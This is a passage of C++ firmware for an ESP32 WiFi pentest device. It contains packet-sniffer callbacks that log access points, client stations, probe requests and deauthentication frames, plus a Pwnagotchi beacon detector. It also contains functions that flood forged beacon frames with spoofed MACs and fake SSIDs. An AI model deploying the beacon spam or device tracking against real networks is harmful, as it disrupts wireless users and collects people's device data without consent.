        //}
        ap.beacon->add(snifferPacket->payload[34]);
        ap.beacon->add(snifferPacket->payload[35]);

        Serial.print("\nBeacon: ");

        for (int i = 0; i < ap.beacon->size(); i++) {
          char hexCar[4];
          sprintf(hexCar, "%02X", ap.beacon->get(i));
          Serial.print(hexCar);
          if ((i + 1) % 16 == 0)
            Serial.print("\n");
          else
            Serial.print(" ");
        }

        ap.rssi = snifferPacket->rx_ctrl.rssi;

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiBleScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiBleScan wifi_ble_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          //if (display_obj.display_buffer->size() == 0)
          //{
          //  display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          //  display_obj.loading = false;
          //}
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }
        
        AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL,
                          snifferPacket->rx_ctrl.rssi,
                          new LinkedList<uint8_t>()};

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

String WiFiBleScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
  // Approximate the start of JSON payload within the beacon frame
  int jsonStartIndex = 36; // Adjust based on actual frame structure if necessary
  int jsonEndIndex = length;

  // Locate the actual JSON boundaries by finding '{' and '}'
  while (jsonStartIndex < length && frame[jsonStartIndex] != '{') jsonStartIndex++;
  while (jsonEndIndex > jsonStartIndex && frame[jsonEndIndex - 1] != '}') jsonEndIndex--;

  if (jsonStartIndex >= jsonEndIndex) {
    Serial.println("JSON payload not found.");
    return "";
  }

  // Extract JSON substring from frame directly
  String jsonString = String((char*)frame + jsonStartIndex, jsonEndIndex - jsonStartIndex);

  // Estimate an appropriate JSON document size based on payload length
  size_t jsonCapacity = jsonString.length() * 1.5; // Adding buffer for ArduinoJson needs

  // Check if we have enough memory before creating StaticJsonDocument
  if (jsonCapacity > ESP.getFreeHeap()) {
    Serial.println("Insufficient memory to parse JSON.");
    return "";
  }

  // Parse JSON payload using ArduinoJson library
  StaticJsonDocument<2048> doc;
  DeserializationError error = deserializeJson(doc, jsonString);

  if (error) {
    Serial.print("Failed to parse JSON: ");
    Serial.println(error.c_str());
    return "";
  }

  // Check for Pwnagotchi keys "name" and "pwnd_tot"
  if (doc.containsKey("name") && doc.containsKey("pwnd_tot")) {
    const char* name = doc["name"];
    const char* ver = doc["version"];
    int pwnd_tot = doc["pwnd_tot"];
    bool deauth = doc["policy"]["deauth"];
    int uptime = doc["uptime"];

    // Print and return the Pwnagotchi name and pwnd_tot
    Serial.print("Pwnagotchi Name: ");
    Serial.println(name);
    Serial.print("Pwnd Totals: ");
    Serial.println(pwnd_tot);

    #ifdef HAS_SCREEN

      display_obj.display_buffer->add(String("Pwnagotchi: ") + name + ",                 ");
      display_obj.display_buffer->add("      Pwnd: " + String(pwnd_tot) + ",             ");
      display_obj.display_buffer->add("    Uptime: " + String(uptime) + ",               ");
      if (deauth)
        display_obj.display_buffer->add("    Deauth: true,                       ");
      else
        display_obj.display_buffer->add("    Deauth: false,                      ");

      display_obj.display_buffer->add(String("       Ver: ") + ver + "                   ");
    #endif

    return String("Pwnagotchi: ") + name + ", \nPwnd: " + String(pwnd_tot) + ", \nVer: " + ver;
  } else {
    Serial.println("Not a Pwnagotchi frame.");
    return "";
  }
}


void WiFiBleScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiBleScan wifi_ble_scan_obj;

  #ifdef HAS_GPS
    extern GpsInterface gps_obj;
  #endif

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buff = display_obj.display_buffer->size();
    #else
      int buff = 0;
    #endif

    uint8_t target_mac[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

    // It is a beacon
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0))
    {
      bool mac_match = true;
      for (int i = 0; i < 6; i++) {
        if (snifferPacket->payload[10 + i] != target_mac[i]) {
          mac_match = false;
          break;
        }
      }

      // If MAC matches, call processPwnagotchiBeacon with frame data
      if (mac_match) {
        Serial.println("Pwnagotchi beacon detected!");
        wifi_ble_scan_obj.processPwnagotchiBeacon(snifferPacket->payload, len);
        return;
      }

      if (wifi_ble_scan_obj.currentScanMode == WIFI_SCAN_PWN) {
        buffer_obj.append(snifferPacket, len);
        return;
      }
      
      // Do signal strength stuff first
      else if (wifi_ble_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
        bool found = false;
        uint8_t targ_index = 0;
        AccessPoint targ_ap;

        // Check list of APs
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            uint8_t addr[] = {snifferPacket->payload[10],
                              snifferPacket->payload[11],
                              snifferPacket->payload[12],
                              snifferPacket->payload[13],
                              snifferPacket->payload[14],
                              snifferPacket->payload[15]};
            // Compare AP bssid to ssid of recvd packet
            for (int x = 0; x < 6; x++) {
              if (addr[x] != access_points->get(i).bssid[x]) {
                found = false;
                break;
              }
              else
                found = true;
            }
            if (found) {
              //Serial.println("Received beacon from " + access_points->get(i).essid + ". Checking RSSI...");
              targ_ap = access_points->get(i);
              targ_index = i;
              break;
            }
          }
        }
        if (!found)
          return;

        if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
          targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
          access_points->set(targ_index, targ_ap);
          Serial.println((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
          return;
        }
      }

      else if (wifi_ble_scan_obj.currentScanMode == WIFI_SCAN_AP) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        Serial.print(" ESSID Len: " + (String)snifferPacket->payload[37]);
        Serial.print(" ESSID: ");
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        int temp_len = display_string.length();

        #ifdef HAS_SCREEN
          for (int i = 0; i < 40 - temp_len; i++)
          {
            display_string.concat(" ");
          }
    
          Serial.print(" ");
    
          //if (display_obj.display_buffer->size() == 0)
          //{
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          //}
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }    
    }
  }
}

void WiFiBleScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String mac = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  char ap_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";

  int ap_index = 0;

  // Check if frame has ap in list of APs and determine position
  uint8_t frame_offset = 0;
  int offsets[2] = {10, 4};
  bool matched_ap = false;
  bool ap_is_src = false;

  bool mac_match = true;

  for (int y = 0; y < 2; y++) {
    for (int i = 0; i < access_points->size(); i++) {
      
      //added by s
      if (access_points->get(i).selected) { 

        mac_match = true;
        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
            mac_match = false;
            break;
          }
        }
        if (mac_match) {
          matched_ap = true;
          if (offsets[y] == 10)
            ap_is_src = true;
          ap_index = i;
          getMAC(ap_addr, snifferPacket->payload, offsets[y]);
          break;
        }
      }
    }
    if (matched_ap)
      break;
  }

  // If did not find ap from list in frame, drop frame
  if (!matched_ap)
    return;
  else {
    if (ap_is_src)
      frame_offset = 4;
    else
      frame_offset = 10;
  }
  /*  Stuff to care about now
   *  ap_is_src
   *  ap_index
   */
  

  // Check if we already have this station
  bool in_list = false;
  for (int i = 0; i < stations->size(); i++) {
    mac_match = true;
    
    for (int x = 0; x < 6; x++) {
      //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
      if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
        mac_match = false;
        //Serial.println("MACs do not match");
        break;
      }
    }
    if (mac_match) {
      in_list = true;
      break;
    }
  }

  getMAC(dst_addr, snifferPacket->payload, 4);

  // Check if dest is broadcast
  if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
    return;
  
  // Add to list of stations
  Station sta = {
                {snifferPacket->payload[frame_offset],
                 snifferPacket->payload[frame_offset + 1],
                 snifferPacket->payload[frame_offset + 2],
                 snifferPacket->payload[frame_offset + 3],
                 snifferPacket->payload[frame_offset + 4],
                 snifferPacket->payload[frame_offset + 5]},
                false};

  stations->add(sta);

  // Print findings to serial
  Serial.print((String)stations->size() + ": ");
  
  char sta_addr[] = "00:00:00:00:00:00";
  
  if (ap_is_src) {
    Serial.print("ap: ");
    Serial.print(ap_addr);
    Serial.print(" -> sta: ");
    getMAC(sta_addr, snifferPacket->payload, 4);
    Serial.println(sta_addr);
  }
  else {
    Serial.print("sta: ");
    getMAC(sta_addr, snifferPacket->payload, 10);
    Serial.print(sta_addr);
    Serial.print(" -> ap: ");
    Serial.println(ap_addr);
  }
  display_string.concat(sta_addr);
  display_string.concat(" -> ");
  display_string.concat(access_points->get(ap_index).essid);

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif

  // Add station index to AP in list
  //access_points->get(ap_index).stations->add(stations->size() - 1);

  AccessPoint ap = access_points->get(ap_index);
  ap.stations->add(stations->size() - 1);

  access_points->set(ap_index, ap);

  buffer_obj.append(snifferPacket, len);
}

void WiFiBleScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiBleScan wifi_ble_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  if (wifi_ble_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
    bool found = false;
    uint8_t targ_index = 0;
    AccessPoint targ_ap;

    // Check list of APs
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != access_points->get(i).bssid[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_ap = access_points->get(i);
          targ_index = i;
          break;
        }
      }
    }
    if (!found)
      return;

    if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);
      int rssi = access_points->get(targ_index).rssi; //by s
      Serial.print((String)access_points->get(targ_index).essid + " RSSI: " + (String)rssi);
      display_string = (String)access_points->get(targ_index).essid + " RSSI: " + (String)rssi;
      //Serial.print((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi); //by s 
      //display_string = (String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi;
    }
    else
      return;
  }

  else {
    Serial.print("RSSI: ");
    Serial.print(snifferPacket->rx_ctrl.rssi);
    Serial.print(" Ch: ");
    Serial.print(snifferPacket->rx_ctrl.channel);
    Serial.print(" BSSID: ");
    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    Serial.print(addr);
    display_string.concat(text_table4[0]);
    display_string.concat(snifferPacket->rx_ctrl.rssi);

    display_string.concat(" ");
    display_string.concat(addr);
  }

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif

  Serial.println();

  buffer_obj.append(snifferPacket, len);
}

void WiFiBleScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      char dst_addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      getMAC(dst_addr, snifferPacket->payload, 4);
      Serial.print(addr);
      Serial.print(" -> ");
      Serial.print(dst_addr);
      display_string.concat(text_table4[0]);
      display_string.concat(snifferPacket->rx_ctrl.rssi);

      display_string.concat(" ");
      display_string.concat(addr);

      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiBleScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {

  extern WiFiBleScan wifi_ble_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    //#ifdef HAS_SCREEN
    //  int buf = display_obj.display_buffer->size();
    //#else
    int buf = 0;
    //#endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {
      if (wifi_ble_scan_obj.currentScanMode == WIFI_SCAN_PROBE) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" Client: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" Requesting: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[25]; i++)
        {
          Serial.print((char)snifferPacket->payload[26 + i]);
          display_string.concat((char)snifferPacket->payload[26 + i]);
        }

        // Print spaces because of the rotating lines of the hardware scroll.
        // The same characters print from previous lines so I just overwrite them
        // with spaces.
        #ifdef HAS_SCREEN
          for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
          {
            display_string.concat(" ");
          }
    
          if (display_obj.display_buffer->size() == 0)
          {
            //while (display_obj.printing)
            //  delay(1);
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
        Serial.println();    

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiBleScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  bool found = false;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {

      for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
      {
        essid.concat((char)snifferPacket->payload[26 + i]);
      }

      for (int i = 0; i < ssids->size(); i++) {
        if (ssids->get(i).essid == essid) {
          Serial.println("Found a sheep");
          found = true;
          break;
        }
      }

      if (!found)
        return;
      
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");

      // ESSID
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
        {
          display_string.concat(" ");
        }
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();    

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiBleScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  if (custom_ssid.beacon->size() == 0)
    return;


  // Randomize SRC MAC
  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int realLen = strlen(ESSID);
  int ssidLen = random(realLen, 33);
  int numSpace = ssidLen - realLen;
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < realLen; i++)
    packet[38 + i] = ESSID[i];

  for(int i = 0; i < numSpace; i++)
    packet[38 + realLen + i] = 0x20;

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  //for(int i = 0; i < 12; i++) 
  //  packet[38 + fullLen + i] = postSSID[i];

  packet[34] = custom_ssid.beacon->get(0);
  packet[35] = custom_ssid.beacon->get(1);
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

void WiFiBleScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
  set_channel = custom_ssid.channel;
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiBleScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
  
}

// Function for sending crafted beacon frames
void WiFiBleScan::broadcastRandomSSID(uint32_t currentTime) {

  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  // Randomize SSID (Fixed size 6. Lazy right?)
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + 6 + i] = postSSID[i];

